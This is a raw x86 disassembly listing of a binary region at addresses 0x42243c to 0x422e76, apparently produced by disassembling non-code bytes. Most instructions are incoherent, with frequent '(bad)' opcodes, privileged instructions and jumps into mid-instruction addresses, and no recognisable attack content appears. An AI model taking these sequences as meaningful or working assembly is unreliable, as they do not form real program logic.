  42243c:	xor    esi,DWORD PTR [edx+0x5e2b60b]
  422442:	mov    al,bl
  422444:	and    BYTE PTR [ecx],ah
  422446:	jg     0x422441
  422448:	icebp  
  422449:	add    DWORD PTR [ebx+0xf4bd],ecx
  42244f:	punpckhbw mm7,QWORD PTR [edx-0x4]
  422453:	jmp    esp
  422455:	test   ebp,esp
  422457:	add    bl,dh
  422459:	test   bh,dl
  42245b:	add    esi,esp
  42245d:	add    BYTE PTR [edi-0x17],bh
  422460:	fld    QWORD PTR [ecx]
  422462:	test   dl,dl
  422464:	out    0x0,eax
  422466:	add    BYTE PTR [ecx+0x28],cl
  422469:	add    BYTE PTR [ebp+0xf],al
  42246c:	sub    BYTE PTR [ecx-0x545b0001],cl
  422472:	test   al,0x0
  422474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422475:	add    BYTE PTR [eax-0x7bfe2b05],al
  42247b:	mov    edx,0x800000b7
  422480:	das    
  422481:	icebp  
  422482:	or     cl,BYTE PTR [edx+edi*8-0xb000009]
  422489:	mov    ebp,0x1fe30f35
  42248e:	add    al,0x0
  422490:	fs dec ebp
  422492:	dec    ebx
  422493:	or     BYTE PTR [esi+0x0],bl
  422496:	or     edi,DWORD PTR [esi+0x0]
	...
  4224b4:	add    BYTE PTR [eax],al
  4224b6:	aaa    
  4224b7:	sub    ecx,DWORD PTR [edx]
  4224b9:	call   FWORD PTR [edx+0x34e87fcc]
  4224bf:	pop    ebx
  4224c0:	dec    esi
  4224c1:	mov    ebp,DWORD PTR [esi+ecx*2]
  4224c4:	xlat   BYTE PTR ds:[ebx]
  4224c5:	call   0xfef4c7d7
  4224ca:	inc    edx
  4224cb:	fxch   st(0)
  4224cd:	adc    BYTE PTR [edi-0x3f],dl
  4224d0:	cs or  al,0x2
  4224d3:	pop    ecx
  4224d4:	or     BYTE PTR [ecx*1-0x19f8a629],al
  4224db:	pop    esp
  4224dc:	stc    
  4224dd:	or     al,0x8f
  4224df:	loopne 0x4224e3
  4224e1:	add    BYTE PTR ds:0xce20c752,cl
  4224e7:	push   esi
  4224e8:	int3   
  4224e9:	cld    
  4224ea:	adc    ah,BYTE PTR [ebp-0x23]
  4224ed:	add    BYTE PTR ds:0x57d79d9,cl
  4224f3:	push   eax
  4224f4:	xor    cl,BYTE PTR [esp+esi*8]
  4224f7:	hlt    
  4224f8:	add    al,BYTE PTR [eax]
  4224fa:	or     eax,0x8701499b
  4224ff:	adc    eax,DWORD PTR [ebx]
  422501:	adc    ah,0xe2
  422504:	inc    DWORD PTR [edx+eiz*8+0x12fcce74]
  42250b:	xor    esi,DWORD PTR [ecx+0x4c598f39]
  422511:	inc    eax
  422512:	or     eax,0xa8c785da
  422517:	push   edx
  422518:	iret   
  422519:	jg     0x42251b
	...
  422537:	add    BYTE PTR [ebx+eiz*8-0x2a1c7d01],ah
  42253e:	add    BYTE PTR [eax],al
  422540:	retf   
  422541:	mov    ds:0x4741002,eax
  422546:	add    eax,DWORD PTR [eax]
  422548:	or     eax,0x10dc956
  42254d:	xchg   ebp,eax
  42254e:	xor    esi,0x2
  422551:	xchg   ebp,eax
  422552:	test   DWORD PTR [eax-0x97cf6b4],0x9486aa0f
  42255c:	pop    eax
  42255d:	add    BYTE PTR [esi],ah
  42255f:	shr    eax,1
  422561:	ret    0x2a4
  422564:	std    
  422565:	(bad)  
  422566:	(bad)  
  422567:	dec    DWORD PTR [eax+eax*1]
  42256a:	out    0xd1,eax
  42256c:	sar    dh,1
  42256e:	jo     0x4225b2
  422570:	or     al,0x80
  422572:	inc    DWORD PTR [esi]
  422574:	sbb    BYTE PTR [ebx-0x34de3094],al
  42257a:	fstp   QWORD PTR [ecx+0x7769064b]
  422580:	call   0xd452:0x8e00e73f
  422587:	rol    BYTE PTR [ecx],1
  422589:	or     bh,0x7
  42258c:	or     BYTE PTR [ebp+0xd05cb],al
  422592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422593:	dec    ecx
  422594:	pmaxsw mm7,QWORD PTR [edi-0x18fff351]
  42259b:	rol    DWORD PTR [eax],1
	...
  4225b9:	add    BYTE PTR [eax-0x1],dl
  4225bc:	jo     0x4225ff
  4225be:	or     al,0x80
  4225c0:	lahf   
  4225c1:	std    
  4225c2:	sbb    DWORD PTR [ebx-0x353e30c4],eax
  4225c8:	fstp   QWORD PTR [ecx+0x7b6905cb]
  4225ce:	cmp    al,BYTE PTR [eax-0x19]
  4225d1:	add    BYTE PTR [esi-0x5e2f8bbe],cl
  4225d7:	jg     0x422648
  4225d9:	cli    
  4225da:	or     DWORD PTR [ebp+0xd059b],eax
  4225e0:	and    eax,0x3ff10f49
  4225e5:	lahf   
  4225e6:	or     al,0x0
  4225e8:	out    0x83,eax
  4225ea:	jne    0x4225e1
  4225ec:	cmc    
  4225ed:	xchg   BYTE PTR [edx+edx*8-0x6de62fc3],dl
  4225f4:	jmp    FWORD PTR [esi-0x26187ef8]
  4225fa:	inc    esp
  4225fb:	inc    esp
  4225fc:	call   edi
  4225fe:	mov    edx,0xd9547e5
  422603:	cmp    BYTE PTR ds:0xc26c,cl
  422609:	jmp    0x1052229c
  42260e:	mov    al,BYTE PTR [eax]
  422610:	add    cl,ch
  422612:	mov    ?,esp
  422614:	pop    es
  422615:	add    dl,dl
  422617:	std    
  422618:	(bad)  
  422619:	call   0xd04622ac
	...
  42263a:	add    BYTE PTR [eax],al
  42263c:	mov    ch,0xfd
  42263e:	(bad)  
  42263f:	call   0x6416a14
  422644:	loopne 0x42269e
  422646:	add    ch,cl
  422648:	push   cs
  422649:	ja     0x422610
  42264b:	shl    DWORD PTR [edx-0x2],1
  42264e:	(bad)  
  42264f:	call   0xdab5afe9
  422654:	add    esp,DWORD PTR fs:[edx+ebp*8]
  422658:	fist   DWORD PTR [ebx-0x175e6141]
  42265e:	mov    edi,0x80d0b16a
  422663:	test   eax,0xda00d8b8
  422668:	into   
  422669:	or     DWORD PTR [eax+0x7c77082f],ecx
  42266f:	loope  0x422606
  422671:	int3   
  422672:	or     al,0x6d
  422674:	std    
  422675:	std    
  422676:	(bad)  
  422677:	call   0x3f3ee193
  42267c:	test   BYTE PTR [ecx-0x32d19af4],cl
  422682:	cld    
  422683:	push   esi
  422684:	pop    es
  422685:	inc    ebx
  422686:	adc    eax,0x4f59205
  42268b:	add    ch,bl
  42268d:	(bad)  
  42268e:	icebp  
  42268f:	jmp    FWORD PTR [ebx]
  422691:	test   bh,dh
  422693:	or     ch,BYTE PTR [ebx+0x78]
  422696:	push   cs
  422697:	imul   DWORD PTR [ebx]
  422699:	mov    ecx,0xfd60667f
  42269e:	cmc    
  42269f:	inc    esi
	...
  4226bc:	add    BYTE PTR [eax],al
  4226be:	inc    ebx
  4226bf:	jge    0x4226cc
  4226c1:	test   esi,ecx
  4226c3:	std    
  4226c4:	(bad)  
  4226c5:	jmp    FWORD PTR [esi-0x1b3c7927]
  4226cb:	stos   DWORD PTR es:[edi],eax
  4226cc:	(bad)  
  4226cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226ce:	push   esp
  4226cf:	sub    BYTE PTR [eax+ebp*4],dl
  4226d2:	xor    eax,0x25f681ca
  4226d7:	std    
  4226d8:	dec    DWORD PTR [edx+0x4e87cbe2]
  4226de:	clc    
  4226df:	inc    ebp
  4226e0:	int    0xb
  4226e2:	lds    esp,FWORD PTR [edi]
  4226e4:	jnp    0x550cb9c
  4226ea:	in     al,0xfc
  4226ec:	add    al,0x20
  4226ef:	push   edx
  4226f0:	jge    0x4226d5
  4226f2:	test   ecx,0x7ecfc3b2
  4226f8:	pop    ds
  4226f9:	shl    DWORD PTR [edi-0x4b],0xfb
  4226fd:	je     0x4226bc
  4226ff:	ret    0x142
  422702:	fsubr  DWORD PTR [ebx-0x35bfe39]
  422708:	jg     0x4226ed
  42270a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42270b:	xor    BYTE PTR [edx],dl
  42270d:	call   0x42285c
  422712:	xor    DWORD PTR [ebp+0x42720970],edi
  422718:	std    
  422719:	cmp    al,0x3d
  42271b:	jno    0x42271a
  42271d:	push   DWORD PTR [ebp+eax*2-0x3d]
  422721:	call   0x422726
	...
  42273e:	add    BYTE PTR [eax],al
  422740:	or     eax,0xd00050f
  422745:	ror    DWORD PTR fs:[ecx+ecx*4],0x9e
  42274a:	int    0xfc
  42274c:	push   0xffffffc5
  42274e:	rol    BYTE PTR [ebx-0x40881eba],0xc5
  422755:	push   ebp
  422756:	loope  0x422762
  422758:	mov    ss,WORD PTR [esi]
  42275a:	add    eax,0xcde9d5e7
  42275f:	cld    
  422760:	mov    ?,WORD PTR [edx+0x24]
  422763:	sbb    BYTE PTR ds:0xc988f874,cl
  422769:	mov    edx,0xc2d186f0
  42276e:	call   0x24fcf0fb
  422773:	dec    eax
  422774:	test   BYTE PTR [edx+0x2b241024],ah
  42277a:	add    DWORD PTR [eax],eax
  42277c:	or     eax,0x97c092d6
  422781:	pop    ecx
  422782:	lods   al,BYTE PTR ds:[esi]
  422783:	imul   ecx,DWORD PTR [ebp-0x27],0xc
  422787:	std    
  422788:	add    dl,BYTE PTR [ebp+0x37]
  42278b:	add    cl,BYTE PTR ds:0xcdbdfbd9
  422791:	xor    BYTE PTR [ecx+0x45],bh
  422794:	add    eax,0xcb0c3660
  422799:	pop    ss
  42279a:	add    DWORD PTR [esp+esi*4],esi
  42279d:	or     BYTE PTR [ecx],al
  42279f:	add    BYTE PTR ds:0xac759,cl
	...
  4227c1:	add    BYTE PTR [eax-0x20],al
  4227c4:	ret    0xc45
  4227c7:	xchg   ecx,ebx
  4227c9:	inc    eax
  4227ca:	or     al,0xd9
  4227cc:	add    BYTE PTR ds:0x8f799a5b,cl
  4227d2:	mov    ch,0xc5
  4227d4:	inc    eax
  4227d5:	add    BYTE PTR [ebp-0x329f00],cl
  4227db:	out    dx,al
  4227dc:	leavew 
  4227de:	inc    ebp
  4227df:	dec    esp
  4227e0:	loopne 0x422765
  4227e2:	jne    0x422804
  4227e4:	fiadd  WORD PTR [esi+0x3e70200]
  4227ea:	push   ebx
  4227eb:	ds call 0xe8289207
  4227f1:	add    ecx,DWORD PTR ds:0x85ffac7b
  4227f7:	ds out dx,eax
  4227f9:	js     0x422854
  4227fb:	test   DWORD PTR [edx-0x3d],0x806c10e
  422802:	test   BYTE PTR [eax+0x694c8ddd],ch
  422808:	jmp    0xc1fc25b8
  42280d:	mov    esp,0x3688211
  422812:	or     eax,0xd5fa7600
  422817:	and    eax,0x4e8cfcef
  42281c:	call   0xa9bd3524
  422821:	and    BYTE PTR [edx+0xccce82],bh
	...
  422843:	add    BYTE PTR [ecx],al
  422845:	jl     0x422897
  422847:	add    ecx,DWORD PTR ds:0x152d7000
  42284d:	jns    0x422873
  42284f:	add    dl,dh
  422851:	test   eax,0x800d03e6
  422856:	mov    eax,ds:0xb77d19fe
  42285b:	add    ecx,DWORD PTR ds:0x3a808200
  422861:	retf   
  422862:	loopne 0x422860
  422864:	pop    DWORD PTR [ebx+edi*2+0x247aa9cc]
  42286b:	cld    
  42286c:	lea    ebx,[ebp+0x0]
  42286f:	in     eax,dx
  422870:	push   cs
  422871:	stc    
  422872:	inc    ebp
  422873:	fnstsw WORD PTR [ebx]
  422875:	clc    
  422876:	jg     0x42286f
  422878:	fistp  WORD PTR cs:[eax-0x3a3caeac]
  42287f:	scas   eax,DWORD PTR es:[edi]
  422880:	(bad)  
  422881:	movntq QWORD PTR [eax+0x7200000e],mm0
  422888:	shl    ebx,cl
  42288a:	mov    BYTE PTR [ebp-0x58770fd6],bh
  422890:	pop    edx
  422891:	ja     0x4228f0
  422893:	loope  0x42288a
  422895:	mov    esp,0x6d3eac00
  42289a:	cmp    BYTE PTR [ebx],dh
  42289c:	fyl2xp1 
  42289e:	jno    0x42288d
  4228a0:	add    eax,0xb5e570a8
  4228a5:	mov    edi,0x1888
	...
  4228c6:	lea    ecx,[edx+0x24]
  4228c9:	loope  0x4228d9
  4228cb:	push   ebx
  4228cc:	add    al,0x60
  4228ce:	retf   0x181b
  4228d1:	ret    0x7966
  4228d4:	inc    ebx
  4228d5:	out    dx,al
  4228d6:	xlat   BYTE PTR ds:[ebx]
  4228d7:	jle    0x42291c
  4228d9:	add    eax,0x62c9e8f9
  4228de:	sar    al,cl
  4228e0:	mov    esi,0x86f82760
  4228e5:	aaa    
  4228e6:	in     eax,0x52
  4228e8:	arpl   WORD PTR [edi-0x3dc93ab1],sp
  4228ee:	es cmp al,0xdc
  4228f2:	xlat   BYTE PTR ds:[ebx]
  4228f3:	or     BYTE PTR [edx-0x64],0xd6
  4228f7:	les    eax,FWORD PTR [eax-0x1812e3]
  4228fd:	scas   al,BYTE PTR es:[edi]
  4228fe:	dec    edi
  4228ff:	lds    edi,FWORD PTR [ecx]
  422901:	adc    eax,0x7c76f2
  422906:	enter  0xfb80,0x74
  42290a:	rol    BYTE PTR [esi+0x51],1
  42290d:	and    al,0xbc
  42290f:	inc    esi
  422910:	inc    ecx
  422911:	and    al,0xb4
  422913:	out    0xc1,al
  422915:	push   eax
  422916:	dec    DWORD PTR [ecx-0x44162805]
  42291c:	jo     0x422928
  42291e:	out    dx,al
  42291f:	inc    ecx
  422920:	adc    esp,DWORD PTR [edx+ebp*8]
  422923:	mov    DWORD PTR [edx],0x86d2ba88
  422929:	inc    esi
	...
  422946:	add    BYTE PTR [eax],al
  422948:	cmp    esp,ebp
  42294a:	jp     0x4228d4
  42294c:	test   al,0xe5
  42294e:	or     cl,BYTE PTR [edi]
  422950:	jmp    0xf442192a
  422955:	jl     0x4229b7
  422957:	and    al,0xc
  422959:	cld    
  42295a:	out    0x11,al
  42295c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42295d:	mov    ah,0x6
  42295f:	pop    gs
  422961:	mov    eax,0x7d13fff0
  422966:	bound  eax,QWORD PTR [esp+esi*1]
  422969:	mov    edi,0xba570142
  42296e:	inc    eax
  42296f:	and    al,0x34
  422971:	inc    esi
  422972:	inc    ecx
  422973:	and    al,0x4
  422975:	inc    esi
  422976:	cmc    
  422977:	cmp    ebp,DWORD PTR [eax]
  422979:	and    BYTE PTR [edi+ecx*1],ah
  42297c:	imul   edx,DWORD PTR [ebp-0x13],0x5a45c3ff
  422983:	or     BYTE PTR [edi+0x3d],dh
  422986:	and    al,0x1c
  422988:	hlt    
  422989:	leave  
  42298a:	sub    cl,0xe4
  42298d:	add    BYTE PTR [eax],al
  42298f:	mov    esp,DWORD PTR [edi]
  422991:	les    eax,FWORD PTR [ecx-0x24bb3c40]
  422997:	add    BYTE PTR [eax+eax*1-0x4cf2ab79],dh
  42299e:	in     al,0x88
  4229a0:	ret    0x34c1
  4229a3:	and    al,0x9
  4229a5:	call   0x66e4f726
  4229aa:	jg     0x42296b
	...
  4229c8:	add    BYTE PTR [eax],al
  4229ca:	and    ecx,esp
  4229cc:	jp     0x422a13
  4229ce:	cli    
  4229cf:	mov    edx,0x4f0e0b85
  4229d4:	aas    
  4229d5:	adc    eax,0x7cf19c7b
  4229da:	or     dl,BYTE PTR [ebx-0x6e]
  4229dd:	push   DWORD PTR [edx-0x2a]
  4229e0:	jge    0x4229a6
  4229e2:	je     0x422a40
  4229e4:	aam    0xfc
  4229e6:	bound  edx,QWORD PTR [eax+0x3f]
  4229e9:	adc    eax,0x6f56031
  4229ee:	fs add DWORD PTR es:[eax],eax
  4229f2:	or     eax,0xe9153f51
  4229f7:	jle    0x4229ed
  4229f9:	pop    ss
  4229fa:	and    al,0x52
  4229fc:	add    DWORD PTR [eax],eax
  4229fe:	or     eax,0xf1153f61
  422a03:	dec    ebx
  422a04:	cmc    
  422a05:	or     dh,BYTE PTR [esi]
  422a07:	cmp    DWORD PTR [edx+0x45],0xb6fb302
  422a0e:	clc    
  422a0f:	add    DWORD PTR [ebx-0x76],edx
  422a12:	push   ebx
  422a13:	ret    0x961c
  422a16:	adc    ebx,ecx
  422a18:	(bad)  [esi-0x79]
  422a1b:	adc    ebp,edi
  422a1d:	and    ecx,DWORD PTR [eax+0x5387fda5]
  422a23:	mov    ds:0x82dc57d9,al
  422a28:	(bad)  
  422a29:	mov    bl,dl
  422a2b:	sar    DWORD PTR [esi+0x1],0x0
	...
  422a4b:	add    BYTE PTR ds:0x41bf7dd9,cl
  422a51:	add    dl,bh
  422a53:	jge    0x422a5d
  422a55:	sbb    al,0xea
  422a57:	clc    
  422a58:	add    al,0x9d
  422a5b:	lods   al,BYTE PTR ds:[esi]
  422a5c:	adc    eax,0x9de469c0
  422a61:	jg     0x422a09
  422a63:	repz mov ch,0xff
  422a66:	mov    ecx,0x2c77dac3
  422a6b:	add    eax,DWORD PTR [ebx+eax*2-0xc768131]
  422a72:	push   0x12
  422a74:	jg     0x422a39
  422a76:	pop    ebp
  422a77:	jge    0x422ac1
  422a79:	ret    
  422a7a:	cmp    eax,0x62f3b27f
  422a7f:	push   ds
  422a80:	pop    edi
  422a81:	ret    
  422a82:	inc    ebp
  422a83:	jle    0x422a4d
  422a85:	jmp    0x425e:0xfb068102
  422a8c:	clc    
  422a8d:	fcom   st(1)
  422a8f:	aad    0x49
  422a91:	ret    
  422a92:	jo     0x422ad6
  422a94:	sbb    BYTE PTR [esi+esi*2],bl
  422a97:	clc    
  422a98:	and    edi,edx
  422a9a:	in     eax,dx
  422a9b:	jge    0x422a65
  422a9d:	jmp    0x426e:0xe9166ac2
  422aa4:	clc    
  422aa5:	jne    0x422a4b
  422aa7:	lock jb 0x422aed
  422aaa:	out    0x7e,al
  422aac:	and    dl,al
  422aae:	in     eax,dx
  422aaf:	enter  0x0,0x0
	...
  422acb:	add    BYTE PTR [eax],al
  422acd:	add    BYTE PTR [esi],ch
  422acf:	fs repnz out 0xf5,eax
  422ad3:	jne    0x422b3e
  422ad5:	inc    edi
  422ad6:	xor    esp,ebp
  422ad8:	out    0x4f,al
  422ada:	and    esi,DWORD PTR [edi+0x29]
  422add:	clc    
  422ade:	(bad)  
  422adf:	mov    edi,0x2b94213a
  422ae4:	add    esi,eax
  422ae6:	test   DWORD PTR [edx+0x1c1501ff],esi
  422aec:	adc    al,0x18
  422aee:	dec    eax
  422aef:	mov    ch,0xfc
  422af1:	mov    ecx,0xf3738343
  422af6:	cmp    BYTE PTR ds:0xf732cd15,bh
  422afc:	add    esp,DWORD PTR [ecx+0x4c]
  422aff:	in     eax,dx
  422b00:	cmc    
  422b01:	das    
  422b02:	pushf  
  422b03:	inc    ebx
  422b04:	or     eax,0xfcc3aa64
  422b09:	jbe    0x422a94
  422b0b:	inc    esi
  422b0c:	and    al,0xc9
  422b0e:	push   cs
  422b0f:	dec    esp
  422b10:	cs jb  0x422adc
  422b13:	sti    
  422b14:	sub    BYTE PTR [ecx],0xca
  422b17:	sbb    al,0x89
  422b19:	mov    ebp,0x1e892012
  422b1e:	or     DWORD PTR [esp],esi
  422b21:	or     DWORD PTR [esi],ebx
  422b23:	jns    0x422af2
  422b25:	ds sahf 
  422b27:	jge    0x422ae8
  422b29:	mov    ebp,0xd6457850
  422b2e:	sub    bh,BYTE PTR [esi+0xb]
  422b31:	jmp    0x422b33
	...
  422b4f:	add    dh,al
  422b51:	cmp    al,0x15
  422b53:	pop    ss
  422b54:	int3   
  422b55:	in     al,dx
  422b56:	jl     0x422b3e
  422b58:	mov    bl,0xa3
  422b5a:	std    
  422b5b:	push   cs
  422b5c:	push   ebp
  422b5d:	jg     0x422bda
  422b5f:	int    0x36
  422b61:	ret    0xcd70
  422b64:	cdq    
  422b65:	aas    
  422b66:	adc    al,0x6c
  422b68:	dec    esi
  422b69:	dec    esi
  422b6a:	and    esp,DWORD PTR [edx+0x3a]
  422b6d:	sbb    al,0x18
  422b6f:	jb     0x422b2b
  422b71:	sbb    dl,cl
  422b73:	cmp    BYTE PTR [esi-0x4d],dh
  422b76:	cld    
  422b77:	mov    ecx,0xe373818c
  422b7c:	cmp    edx,DWORD PTR fs:0x9421000
  422b83:	push   es
  422b84:	pop    esp
  422b85:	add    dl,BYTE PTR [ebx]
  422b87:	mul    BYTE PTR [edx]
  422b89:	sar    DWORD PTR [ebx+0xf],1
  422b8c:	xor    DWORD PTR [eax-0x6],ebp
  422b8f:	jmp    FWORD PTR [ebx+0x45]
  422b92:	inc    edx
  422b93:	adc    bl,bh
  422b95:	sbb    DWORD PTR [edi-0x75],edx
  422b98:	adc    DWORD PTR [edi],0x4db40cc2
  422b9e:	inc    ebx
  422b9f:	xchg   edi,eax
  422ba0:	cmc    
  422ba1:	sti    
  422ba2:	fs xchg ebp,eax
  422ba4:	in     eax,0xfb
  422ba6:	lahf   
  422ba7:	xchg   edi,eax
  422ba8:	in     eax,0xfb
  422baa:	retf   
  422bab:	xchg   edi,eax
  422bac:	xor    eax,0xb597eefc
  422bb1:	std    
  422bb2:	add    BYTE PTR [eax+0x0],bl
	...
  422bd0:	add    BYTE PTR [eax],al
  422bd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bd3:	std    
  422bd4:	adc    bl,BYTE PTR [eax-0x67db025b]
  422bda:	mov    ch,0xfd
  422bdc:	ss cwde 
  422bde:	mov    ch,0xfd
  422be0:	push   edx
  422be1:	cwde   
  422be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422be3:	std    
  422be4:	lahf   
  422be5:	cwde   
  422be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422be7:	std    
  422be8:	mov    ebx,0xe8fd7598
  422bed:	cwde   
  422bee:	jne    0x422bed
  422bf0:	sbb    eax,0x5efd6599
  422bf5:	cdq    
  422bf6:	gs std 
  422bf8:	jle    0x422b93
  422bfa:	jne    0x422bf9
  422bfc:	xchg   ebx,eax
  422bfd:	cdq    
  422bfe:	jne    0x422bfd
  422c00:	pop    esp
  422c01:	call   0xfd65:0x9bc0fd65
  422c08:	add    al,0x9c
  422c0a:	mov    ch,0xfc
  422c0c:	add    al,0x9c
  422c0e:	xor    eax,0x259c04fc
  422c13:	cld    
  422c14:	add    al,0x9c
  422c16:	or     eax,0x89070418
  422c1b:	pop    ss
  422c1c:	add    al,0x7
  422c1e:	adc    DWORD PTR [edi],0x17791a04
  422c24:	add    al,0x1a
  422c26:	jno    0x422c3f
  422c28:	add    al,0x7
  422c2a:	test   eax,0xa11a0417
  422c2f:	pop    ss
  422c30:	add    al,0x1a
  422c32:	cdq    
  422c33:	pop    ss
  422c34:	add    al,0x1a
	...
  422c52:	add    BYTE PTR [eax],al
  422c54:	xchg   ecx,eax
  422c55:	pop    ss
  422c56:	add    al,0x1a
  422c58:	mov    DWORD PTR [edi],edx
  422c5a:	add    al,0x1a
  422c5c:	adc    DWORD PTR [edi],0x17791a04
  422c62:	add    al,0x8c
  422c64:	jno    0x422c7d
  422c66:	add    al,0xa5
  422c68:	test   eax,0xa1b70417
  422c6d:	xchg   edi,eax
  422c6e:	add    cl,cl
  422c70:	cdq    
  422c71:	xchg   edi,eax
  422c72:	add    bl,bl
  422c74:	xchg   ecx,eax
  422c75:	xchg   edi,eax
  422c76:	add    ch,ch
  422c78:	mov    DWORD PTR [edi-0x687ff300],edx
  422c7e:	add    BYTE PTR [edi],bl
  422c80:	js     0x422c19
  422c82:	add    BYTE PTR [edi],bh
  422c84:	jo     0x422c1d
  422c86:	add    BYTE PTR [ebx-0x58],bl
  422c89:	xchg   edi,eax
  422c8a:	add    BYTE PTR [ecx-0x1fff6868],bl
  422c90:	cwde   
  422c91:	xchg   edi,eax
  422c92:	add    BYTE PTR [ecx-0x4eff686e],cl
  422c98:	adc    BYTE PTR [edi-0x6884f500],0x0
  422c9f:	jecxz  0x422d0d
  422ca1:	xchg   edi,eax
  422ca2:	add    BYTE PTR [esi+ebp*2],bl
  422ca5:	xchg   edi,eax
  422ca6:	add    BYTE PTR [eax-0x52],al
  422ca9:	push   0xaeb500
  422cae:	sub    BYTE PTR [edi+ecx*8],al
  422cb1:	arpl   WORD PTR [edi],sp
  422cb3:	add    al,0x25
  422cb5:	xchg   esi,eax
  422cb6:	daa    
  422cb7:	add    al,0x0
	...
  422cd5:	add    BYTE PTR [esi+0x62],dh
  422cd8:	daa    
  422cd9:	add    al,0xf5
  422cdb:	arpl   WORD PTR [edi],sp
  422cdd:	add    al,0x1f
  422cdf:	fs daa 
  422ce1:	add    al,0x8d
  422ce3:	fs daa 
  422ce5:	add    al,0x9f
  422ce7:	xchg   esi,eax
  422ce8:	daa    
  422ce9:	add    al,0xc0
  422ceb:	bound  esp,QWORD PTR [edi]
  422ced:	add    al,0xf3
  422cef:	popa   
  422cf0:	daa    
  422cf1:	add    al,0xb
  422cf3:	sahf   
  422cf4:	daa    
  422cf5:	add    al,0x0
  422cf7:	sahf   
  422cf8:	daa    
  422cf9:	add    al,0xf5
  422cfb:	popf   
  422cfc:	daa    
  422cfd:	add    al,0x53
  422cff:	sahf   
  422d00:	daa    
  422d01:	add    al,0x1b
  422d03:	sahf   
  422d04:	daa    
  422d05:	add    al,0xa2
  422d07:	sahf   
  422d08:	daa    
  422d09:	add    al,0xc2
  422d0b:	sahf   
  422d0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d0d:	add    esi,DWORD PTR [edx-0x62]
  422d10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d11:	add    eax,DWORD PTR [edx]
  422d13:	lahf   
  422d14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d15:	add    ebx,DWORD PTR [edx]
  422d17:	lahf   
  422d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d19:	add    edx,DWORD PTR [edx]
  422d1b:	lahf   
  422d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d1d:	add    ecx,DWORD PTR [edx]
  422d1f:	lahf   
  422d20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d21:	add    edi,DWORD PTR [ecx+ecx*4+0x34dcdd4]
  422d28:	mov    bl,0x41
  422d2a:	adc    BYTE PTR [edi-0x4c],dh
  422d2d:	out    dx,eax
  422d2e:	loope  0x422cba
  422d30:	daa    
  422d31:	pop    edx
  422d32:	test   eax,0x29ccb598
  422d37:	pop    edi
  422d38:	push   0xffffffcc
	...
  422d56:	add    BYTE PTR [eax],al
  422d58:	and    esi,DWORD PTR [ebx]
  422d5a:	(bad)  
  422d5b:	mov    eax,DWORD PTR [esi+0x0]
  422d5e:	out    0x3,eax
  422d60:	stos   DWORD PTR es:[edi],eax
  422d61:	cli    
  422d62:	jmp    DWORD PTR [eax]
  422d64:	pop    ebp
  422d65:	jecxz  0x422ce7
  422d67:	sub    DWORD PTR [ebp+0x26],ebp
  422d6a:	cmp    DWORD PTR [ecx-0x5575e4b6],esi
  422d70:	into   
  422d71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d72:	add    DWORD PTR [ecx-0x7eebccd2],eax
  422d78:	rdpmc  
  422d7a:	adc    BYTE PTR [edx+0x18],dh
  422d7d:	or     BYTE PTR [ecx],ah
  422d7f:	daa    
  422d80:	aad    0x7f
  422d82:	div    DWORD PTR [esi-0x56cefca5]
  422d88:	dec    esi
  422d89:	pop    ecx
  422d8a:	rcr    edx,0xce
  422d8d:	push   edi
  422d8e:	shl    DWORD PTR [edi],0x34
  422d91:	scas   eax,DWORD PTR es:[edi]
  422d92:	gs push 0x50
  422d95:	adc    BYTE PTR [eax],al
  422d97:	pop    ss
  422d98:	cdq    
  422d99:	and    al,0x81
  422d9b:	pop    es
  422d9c:	lahf   
  422d9d:	mov    esi,0x4c0f072
  422da2:	adc    ch,bh
  422da4:	xchg   edi,ebp
  422da6:	mov    edi,0x5b44c0f
  422dab:	icebp  
  422dac:	retf   0xe7b4
  422daf:	outs   dx,DWORD PTR ds:[esi]
  422db0:	dec    ecx
  422db1:	mov    ebx,0x17b65efc
  422db6:	shr    BYTE PTR [ecx+0x7254c128],0x0
	...
  422dd9:	add    al,dl
  422ddb:	pop    ss
  422ddc:	push   0x9
  422dde:	mov    bh,0xff
  422de0:	push   ebp
  422de1:	cmp    ecx,DWORD PTR ss:[esi+0x16]
  422de5:	test   eax,0xdb058a0e
  422dea:	cli    
  422deb:	jecxz  0x422e00
  422ded:	push   0x72
  422def:	or     ah,BYTE PTR [edx+ebp*8]
  422df2:	inc    BYTE PTR ds:0x8028d81
  422df8:	add    BYTE PTR [eax],al
  422dfa:	popf   
  422dfb:	inc    esp
  422dfc:	sbb    BYTE PTR [edi-0x67],bl
  422dff:	mov    ebp,0xd89c1166
  422e04:	or     dh,BYTE PTR [ebx]
  422e06:	xor    al,0x80
  422e08:	js     0x422e2e
  422e0a:	call   0xa4d63913
  422e0f:	pop    DWORD PTR [eax+0x0]
  422e12:	test   BYTE PTR [ecx-0x738be89e],0x42
  422e19:	add    DWORD PTR [esi+0x258a0008],esp
  422e1f:	sbb    DWORD PTR [edx+0x7b6634d0],ecx
  422e25:	je     0x422dd0
  422e27:	xor    esi,0x7f19191b
  422e2d:	jl     0x422df7
  422e2f:	add    eax,0xc6280f00
  422e34:	cli    
  422e35:	retf   0x6634
  422e38:	pop    ss
  422e39:	xor    dh,BYTE PTR [esp+eax*4-0x22]
  422e3d:	jg     0x422e3f
	...
  422e5b:	add    BYTE PTR [esi-0x2f],dl
  422e5e:	test   BYTE PTR [ecx+0x6b],dl
  422e61:	ret    
  422e62:	add    BYTE PTR [eax],al
  422e64:	out    dx,eax
  422e65:	inc    edi
  422e66:	and    al,0x8
  422e68:	xor    DWORD PTR [edx],0x41
  422e6b:	and    al,0x60
  422e6d:	push   ecx
  422e6e:	call   0x464ae7
  422e73:	ret    
  422e74:	shl    edi,cl
  422e76:	and    ecx,DWORD PTR [eax]
